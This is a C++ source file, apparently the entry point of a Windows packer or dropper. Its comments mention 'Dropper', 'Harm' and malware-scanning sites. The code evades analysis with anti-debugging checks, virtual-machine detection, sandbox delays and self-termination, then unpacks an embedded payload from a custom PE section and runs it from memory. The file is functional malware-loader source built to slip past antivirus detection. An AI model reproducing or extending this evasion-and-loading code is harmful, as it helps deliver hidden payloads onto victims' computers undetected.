
#include <windows.h>
#include "Section.h"
#include <iostream>
#include "FileHelper.h"
#include "main.h"
#include "LoadPE.h"
#include "Debug.h"
#include "api.h"
#include <time.h>
#include "escape.h"
#include "DllExport.h"
#include "Public.h"
#include "utils.h"
#include "vm.h"
#include "antiDetect.h"

//http://www.virustotal.com
//http://www.virscan.org
//Dropper 
//Harm


using namespace std;

//1 linker->cmdline /DYNAMICBASE /FIXED
//2  #pragma comment(linker,"/BASE:0X400000")

DWORD gRegEax = 0;
DWORD gRegEcx = 0;
DWORD gRegEdx = 0;
DWORD gRegEbx = 0;
DWORD gRegEsp = 0;
DWORD gRegEbp = 0;
DWORD gRegEsi = 0;
DWORD gRegEdi = 0;

int gType = 0;
HMODULE ghPEModule = 0;
int gPEImageSize = 0;

extern "C" int asmSingleTrap();

extern "C" int asmInt1Proc();

char* ghThisHandle = 0;
HINSTANCE ghprevInstance = 0;
LPSTR glpCmdLine = 0;
int gnShowCmd = 0;

ptrmain glpmain = 0;
ptrDllMainEntry glpDllMainEntry = 0;
ptrWinMain glpWinMain = 0;

HANDLE g_mutex_handle = 0;



#ifdef _WINDLL
int __stdcall DllMain(_In_ HINSTANCE hInstance, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved) {

#ifndef _WIN64
	__asm {
		mov gRegEax, eax
		mov gRegEcx, ecx
		mov gRegEdx, edx
		mov gRegEbx, ebx
		mov gRegEbp, ebp
		mov gRegEsp, esp
		mov gRegEsi, esi
		mov gRegEdi, edi
	}
#endif
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		int ret = 0;
		//ret = Escape::escape();

		ret = getapi();

#ifndef _DEBUG
		if (Debug::PEB_BegingDebugged())
		{
			return TRUE;
		}
#endif

		char secname[] = { '.','l','d','a','t','a',0 };

		ghThisHandle = (char*)hInstance;
		ret = Section::unshellSection((char*)hInstance, secname);

	}
	else if (fdwReason == DLL_PROCESS_DETACH)
	{
		if (glpDllMainEntry != 0 && ghPEModule != 0)
		{
			int ret = glpDllMainEntry((char*)ghPEModule, DLL_PROCESS_DETACH, 0);

			lpVirtualFree(ghPEModule, gPEImageSize, MEM_DECOMMIT);
			lpVirtualFree(ghPEModule, 0, MEM_RELEASE);
		}
	}

	return TRUE;
}
#else
int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
#ifndef _WIN64
	__asm {
		mov gRegEax, eax
		mov gRegEcx, ecx
		mov gRegEdx, edx
		mov gRegEbx, ebx
		mov gRegEbp, ebp
		mov gRegEsp, esp
		mov gRegEsi, esi
		mov gRegEdi, edi
	}
#endif
	int ret = 0;
	ret = getapi();

	ret = VM::delay(VM_EVASION_DELAY);
	if (ret < 0) {
		return -1;
	}
	//VM::checkTickCount();

	VM::checkVM();

	//asmSingleTrap();

	//DebugBreak();

#ifdef _WIN64
	asmInt1Proc();
#else
	__asm
	{
		//int 1
		//int 3
	}

#endif

	ret = exceptTest();

	g_mutex_handle = bRunning(&ret);
	if (g_mutex_handle) {
		if (ret)
		{
			runLog("already running\r\n");
			suicide();
		}
	}
	else {
		runLog("bRunning error\r\n");
		return -1;
	}

	runLog("starting\r\n");

	if (Debug::isDebugged())
	{
		runLog("Debugged\r\n");
		suicide();

		return FALSE;
	}
	//Debug::attach();

	ghThisHandle = (char*)hInstance;
	ghprevInstance = hPrevInstance;
	glpCmdLine = lpCmdLine;
	gnShowCmd = nShowCmd;

	char secname[] = { '.','r','c','d','a','t','a',0 };

	runLog("unshellSection entry\r\n");

	ret = Section::unshellSection((char*)hInstance, secname);

	runLog("unshellSection complete\r\n");

	ExitProcess(0);
	return 0;
}
#endif

#ifdef _MYCONSOLE
int main(int argc, char** argv) {
	int ret = 0;
	ret = Escape::escape();

	ret = getapi();

#ifndef _DEBUG
	if (Debug::PEB_BegingDebugged())
	{
		return FALSE;
	}
#endif

	ghThisHandle = 0;
	ghprevInstance = 0;
	glpCmdLine = 0;
	gnShowCmd = 0;

	//string path = FileHelper::getRunPath();
	//LoadPE::load("D:\\vsproject\\PEShell\\Debug\\write.exe");
	//LoadPE::load("D:\\Program Files (x86)\\Tencent\\QQ\\Bin\\QQPcmgrDownload.exe");
	//LoadPE::load("C:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\Common7\\Tools\\errlook.exe");
	//LoadPE::load("D:\\vsproject\\IteratorAndFind\\Debug\\IteratorAndFind.exe");

	char secname[] = { '.','l','d','a','t','a',0 };

	HANDLE addr = lpGetModuleHandleA(0);
	ret = Section::unshellSection((char*)addr, secname);

	ExitProcess(0);
	return 0;
}
#endif